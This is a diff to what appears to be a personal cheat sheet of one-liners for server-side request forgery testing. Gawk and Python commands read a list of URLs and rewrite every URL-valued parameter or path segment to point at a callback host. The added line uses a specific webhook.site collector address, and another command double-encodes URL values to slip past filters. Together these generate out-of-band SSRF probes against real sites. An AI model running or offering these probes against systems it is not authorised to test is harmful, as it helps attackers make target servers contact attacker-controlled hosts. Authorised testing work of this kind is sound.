@@ -17,3 +17,5 @@ cat urls.txt|gawk 'BEGIN{c=1}{s=$0; out=""; while(match(s,/([?&][^=]+=)(https?:\
 cat urls.txt|gawk 'BEGIN{c=1}{s=$0;out="";while(match(s,/([?&][^=]+=)(https?:\/\/|https?%3A%2F%2F)([^\/&?]+)([^&]*)/,m)){proto=(tolower(m[2])~/^https/?"https://":"http://"); out=out substr(s,1,RSTART-1) m[1] proto "web-hook/emon" c m[4]; c++; s=substr(s,RSTART+RLENGTH)}; print out s}' //decoded shemes
 cat urls.txt |  python3 -c "import sys,re,urllib.parse as u; s=sys.stdin.read(); print(re.sub(r'([?&][^=]+=)([^&]*)', lambda m: m.group(1)+u.quote(u.quote(u.unquote(m.group(2)), safe=''), safe='') if u.unquote(m.group(2)).lower().startswith(('http://','https://')) else m.group(1)+m.group(2), s))" //one liner double encode
 //****************//
+
+gawk 'BEGIN{c=1}{s=$0;out="";while(match(s,/([\/=])(https?:\/\/|https?%3A%2F%2F)([^\/&?]+)([^&]*)/,m)){proto=(tolower(m[2])~/^https/?"https://":"http://"); out=out substr(s,1,RSTART-1) m[1] proto "webhook.site/f3d1422e-04cb-447a-a056-e5f420188d4b/emon" c m[4]; c++; s=substr(s,RSTART+RLENGTH)}; print out s}' /path base ssrf replace /http://domain to /http://webhook
